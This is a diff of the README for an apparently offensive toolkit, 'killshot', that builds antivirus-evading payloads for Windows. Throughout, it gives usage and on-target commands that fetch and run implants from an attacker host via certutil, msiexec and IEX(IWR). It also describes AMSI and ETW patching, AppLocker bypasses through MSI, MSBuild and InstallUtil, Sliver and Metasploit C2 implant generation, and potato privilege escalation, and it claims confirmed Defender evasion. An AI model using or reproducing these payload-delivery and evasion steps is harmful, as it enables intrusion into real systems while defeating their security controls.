@@ -12,6 +12,13 @@ PE/.NET binary ──► Donut (shellcode) ──► base64 (.enc) ──► run
                                               RW→RX memory
                                               Randomized injection method
                                               Polymorphic per build
+
+Sliver beacon ──► shellcode (.bin) ──► MSI custom action DLL ──► msiexec /qn
+                                          │                         │
+                                          │  (>1MB: staged loader)  │
+                                          │  Downloads XOR'd        │
+                                          │  shellcode at runtime   │
+                                          └─────────────────────────┘
 ```
 
 Every invocation produces unique binaries — randomized variable names, API string
@@ -24,30 +31,111 @@ callback, CreateFiber). Runner.exe patches ETW before execution to blind telemet
 # 1. Install (downloads tools + sets up compilers)
 ./install.sh
 
-# 2. Generate everything
+# 2. Generate everything (outputs to ./killshot/)
 killshot generate --all -l 10.10.14.5
 
 # 3. Serve files
 killshot serve
 
-# 4. On target
+# 4a. On target — Runner (any .enc payload)
 certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
 %TEMP%\r.exe -remote http://10.10.14.5:8000/implant.enc
+
+# 4b. On target — MSI (AppLocker bypass, no runner needed)
+certutil -urlcache -split -f http://10.10.14.5:8000/update.msi %TEMP%\u.msi
+msiexec /i %TEMP%\u.msi /qn
 ```
 
 ## Toolkit
 
 | Script | Purpose |
 |---|---|
-| `install.sh` | Downloads tools, installs Go/Donut/garble, verifies everything |
+| `install.sh` | Downloads tools, installs Go 1.25.x/Donut/garble, verifies everything |
 | `killshot.sh` | Main generator — component-based payload generation |
 | `killshot.py` | Converts individual tools to Donut shellcode |
 | `gen_runner.py` | Generates polymorphic Go shellcode loader |
 | `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
 | `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
 | `gen_tool_stager.py` | Generates PowerShell in-memory loaders (fallback) |
-| `gen_msi.py` | MSI/DLL AppLocker bypass (custom action DLL via wixl/MinGW) |
+| `gen_msi.py` | MSI/DLL AppLocker bypass — embedded or staged (WinHTTP download) |
 | `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |
+
+## Usage
+
+All operations go through a single `killshot` command. Output goes to `./killshot/` under the current working directory.
+
+```bash
+# Info & verification
+killshot help                                           # Show help
+killshot list                                           # List available tools
+killshot check                                          # Verify installation
+killshot serve                                          # HTTP server for ./killshot/
+
+# Generate specific components (mix and match)
+killshot generate --runner                              # Polymorphic runner.exe only
+killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
+killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
+killshot generate --implant -l 10.10.14.5 --proto http  # Sliver HTTP beacon
+killshot generate --stager                              # PowerShell stager with AMSI bypass
+killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
+killshot generate --tool Certify                        # Single tool (default params)
+killshot generate --tools                               # All tools to shellcode
+killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
+killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
+killshot generate --loaders                             # PowerShell tool loaders
+
+# AppLocker bypass payloads (requires implant shellcode)
+killshot generate --msi                                 # MSI for msiexec (auto-detects staged)
+killshot generate --msbuild                             # MSBuild XML inline C# task
+killshot generate --installutil                         # InstallUtil C# source
+
+# Generate everything at once
+killshot generate --all -l 10.10.14.5
+```
+
+### Generate Options
+
+| Flag | Default | Description |
+|---|---|---|
+| `-l, --lhost` | `10.99.0.16` | Callback/listener IP |
+| `-p, --lport` | `4444` | C2 listener port |
+| `-h, --http` | `8000` | HTTP file server port |
+| `-f, --framework` | `sliver` | `sliver` or `msf` |
+| `-t, --type` | `beacon` | `beacon` or `session` (Sliver) |
+| `--proto` | `mtls` | `mtls`, `http`, or `https` (Sliver) |
+| `-c, --cmd` | auto | Custom command for potatoes |
+| `--params` | defaults | Custom params for `--tool` |
+| `-o, --output` | auto | Output path for `--tool`/`--potato` |
+
+### MSI Generation (standalone)
+
+`gen_msi.py` can be used directly for fine-grained control:
+
+```bash
+# Embedded mode — shellcode baked into DLL (small payloads <1MB)
+python3 gen_msi.py -i shellcode.bin -o update.msi
+
+# Staged mode — DLL downloads XOR'd shellcode from URL at runtime (large payloads)
+python3 gen_msi.py --url http://10.10.14.5:8000/beacon.bin -i implant.bin -o update.msi
+# This creates update.msi (20KB) + beacon.bin (XOR'd shellcode to serve via HTTP)
+
+# DLL only (for rundll32 or trusted path injection)
+python3 gen_msi.py -i shellcode.bin -o loader.dll --dll-only
+
+# Custom options
+python3 gen_msi.py -i shellcode.bin -o update.msi --name "Windows Update" --xor-key 42
+```
+
+When using `killshot generate --msi`, staged mode is selected automatically if the shellcode exceeds 1MB (typical for Sliver beacons ~19MB).
+
+### install.sh
+
+```bash
+./install.sh              # Full install
+./install.sh --update     # Update all tools to latest versions
+./install.sh --tools-only # Only download tool binaries
+./install.sh --check      # Verify installation
+```
 
 ## Included Tools
 
@@ -88,72 +176,42 @@ certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
 |---|---|---|
 | Whisker | Shadow Credentials attack | `list` |
 
-## Usage
-
-All operations go through a single `killshot` command:
-
-```bash
-# Info & verification
-killshot help                                           # Show help
-killshot list                                           # List available tools
-killshot check                                          # Verify installation
-killshot serve                                          # HTTP server for workspace
-
-# Generate specific components (mix and match)
-killshot generate --runner                              # Polymorphic runner.exe only
-killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
-killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
-killshot generate --stager                              # PowerShell stager with AMSI bypass
-killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
-killshot generate --tool Certify                        # Single tool (default params)
-killshot generate --tools                               # All tools to shellcode
-killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
-killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
-killshot generate --loaders                             # PowerShell tool loaders
-
-# AppLocker bypass payloads (requires implant shellcode)
-killshot generate --msi                                 # MSI/DLL for msiexec/rundll32
-killshot generate --msbuild                             # MSBuild XML inline C# task
-killshot generate --installutil                         # InstallUtil C# source
-
-# Generate everything at once
-killshot generate --all -l 10.10.14.5
-```
-
-### install.sh — Setup & Maintenance
-
-```bash
-# Full install
-./install.sh
-
-# Update all tools to latest versions
-./install.sh --update
-
-# Only download tool binaries
-./install.sh --tools-only
-
-# Verify installation
-./install.sh --check
-```
-
 ## On-Target Usage
 
+### Runner (polymorphic loader for any .enc payload)
 ```powershell
 # Download runner once
 certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\r.exe
 
 # Run any tool
+%TEMP%\r.exe -remote http://LHOST:PORT/implant.enc
 %TEMP%\r.exe -remote http://LHOST:PORT/rubeus.enc
 %TEMP%\r.exe -remote http://LHOST:PORT/mimikatz.enc
 %TEMP%\r.exe -remote http://LHOST:PORT/seatbelt.enc
 %TEMP%\r.exe -remote http://LHOST:PORT/godpotato.enc
 
+# Or local file
+%TEMP%\r.exe -local C:\path\to\payload.enc
+
 # Or use the stager (AMSI bypass + auto-download runner + load implant)
 IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
 ```
 
-### AppLocker Bypass (when EXE execution is blocked)
+### MSI (AppLocker bypass — no runner needed)
+```powershell
+# Embedded MSI (small shellcode baked in)
+certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
+msiexec /i %TEMP%\u.msi /qn
 
+# Staged MSI (large shellcode like Sliver beacons)
+# 1. Serve beacon.bin + update.msi via HTTP
+# 2. On target:
+certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
+msiexec /i %TEMP%\u.msi /qn
+# MSI automatically downloads shellcode from the URL baked into the DLL
+```
+
+### Other AppLocker Bypasses
 ```powershell
 # MSBuild — download XML, execute via trusted .NET binary
 certutil -urlcache -split -f http://LHOST:PORT/build.xml %TEMP%\b.xml
@@ -164,13 +222,9 @@ certutil -urlcache -split -f http://LHOST:PORT/service.cs %TEMP%\s.cs
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\s.dll %TEMP%\s.cs
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\s.dll
 
-# DLL via rundll32 — trusted path or direct execution
+# DLL via rundll32
 certutil -urlcache -split -f http://LHOST:PORT/update.dll %TEMP%\u.dll
-rundll32.exe %TEMP%\u.dll,ExportName 0
-
-# MSI via msiexec (if wixl-generated .msi available)
-certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
-msiexec /i %TEMP%\u.msi /qn
+rundll32.exe %TEMP%\u.dll,DllRegisterServer 0
 ```
 
 ## Evasion Techniques
@@ -182,47 +236,45 @@ msiexec /i %TEMP%\u.msi /qn
 - **Sandbox detection** — timing check catches accelerated sleep in sandboxes
 - **Donut shellcode** — position-independent shellcode from any PE/.NET, runs entirely in-memory
 - **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
-- **Garble compilation** — Go binary obfuscation (when supported by Go version)
+- **Garble compilation** — Go binary obfuscation (requires Go 1.25.x)
 - **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
 - **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
 - **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode
+- **Staged MSI loader** — 20KB MSI downloads XOR'd shellcode via WinHTTP at runtime (avoids embedding 19MB beacon)
+- **MSI trusted binary** — executed by msiexec.exe (Microsoft-signed, AppLocker-whitelisted)
 
 ## Directory Structure
 
 ```
 avbypass/
-├── install.sh            # Installer
+├── install.sh            # Installer (caps Go at 1.25.x for garble)
 ├── killshot.sh           # Main payload generator
 ├── killshot.py           # Tool-to-shellcode converter
 ├── gen_runner.py         # Polymorphic runner generator
 ├── gen_stager.py         # PowerShell stager generator
 ├── gen_potato.py         # Potato privesc generator
-├── gen_msi.py            # MSI/DLL AppLocker bypass generator
+├── gen_msi.py            # MSI/DLL AppLocker bypass (embedded + staged)
 ├── gen_applocker.py      # MSBuild/InstallUtil AppLocker bypass
 ├── gen_tool_stager.py    # Tool loader generator
 ├── go.mod / go.sum       # Go module (cached for offline)
 ├── tools/
 │   ├── potatoes/         # Potato exploit binaries
-│   │   ├── GodPotato.exe
-│   │   ├── PrintSpoofer.exe
-│   │   ├── BadPotato.exe
-│   │   └── EfsPotato.exe
 │   └── windows/          # Offensive tool binaries
-│       ├── Rubeus.exe
-│       ├── SharpHound.exe
-│       ├── Certify.exe
-│       ├── Seatbelt.exe
-│       ├── SharpDPAPI.exe
-│       ├── SharpUp.exe
-│       ├── SharpChrome.exe
-│       ├── winPEAS.exe
-│       ├── Whisker.exe
-│       ├── KrbRelayUp.exe
-│       ├── mimikatz.exe
-│       ├── ligolo-agent.exe
-│       ├── chisel.exe
-│       └── Invoke-Mimikatz.ps1
-└── go/                   # Local Go toolchain (after install)
+└── go/                   # Local Go 1.25.x toolchain (after install)
+```
+
+Generated output (`./killshot/` under CWD):
+```
+killshot/
+├── runner.exe            # Polymorphic loader (unique per build)
+├── implant.enc           # Base64 shellcode for runner
+├── update.msi            # MSI AppLocker bypass (~20KB)
+├── beacon.bin            # XOR'd shellcode for staged MSI (if >1MB)
+├── stager.ps1            # PowerShell stager
+├── build.xml             # MSBuild AppLocker bypass
+├── service.cs            # InstallUtil AppLocker bypass
+├── *.enc                 # Tool shellcode files (rubeus.enc, etc.)
+└── *.enc                 # Potato shellcode files
 ```
 
 ## Requirements
@@ -230,16 +282,19 @@ avbypass/
 | Component | Required | Purpose |
 |---|---|---|
 | Python 3 | Yes | Runs all generators |
-| Go >= 1.24 | Yes | Cross-compiles runner.exe |
+| Go 1.25.x | Yes | Cross-compiles runner.exe (1.26+ breaks garble) |
 | donut-shellcode | Yes | PE-to-shellcode conversion |
-| garble | Optional | Go binary obfuscation |
-| mingw-w64 | Optional | CGO cross-compilation |
-| upx | Optional | Binary size reduction |
+| garble | Yes | Go binary obfuscation |
+| mingw-w64 | Yes | DLL cross-compilation (MSI/AppLocker) |
+| msibuild (msitools) | Optional | MSI packaging (falls back to DLL-only) |
 | Sliver or MSF | Yes* | C2 implant generation |
 
-*Only needed for initial implant. Tools work independently via `killshot.py`.
+*Only needed for implant generation. Tools work independently via `killshot.py`.
 
 ## Tested On
 
-- Windows 11 24H2 (Build 26200) — Defender + cloud protection level 2
+- Windows 11 24H2 (Build 26200) — Defender ON + cloud protection level 2
+  - MSI bypass: Sliver beacon callback confirmed via msiexec.exe
+  - Runner bypass: Sliver beacon callback confirmed via runner.exe
+  - All injection methods (CreateThread, EnumWindows, CreateFiber) functional
 - Windows Server 2022 — Defender with default settings
